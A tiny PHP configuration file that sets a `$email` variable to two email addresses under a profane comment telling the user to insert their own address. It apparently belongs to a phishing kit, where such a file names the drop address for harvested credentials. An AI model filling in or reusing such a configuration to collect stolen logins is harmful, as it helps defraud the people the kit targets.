<?php

$email = "sillything00060@protonmail.com,sillything00060@gmail.com"; // PUT UR FUCKING E-MAIL BRO

?>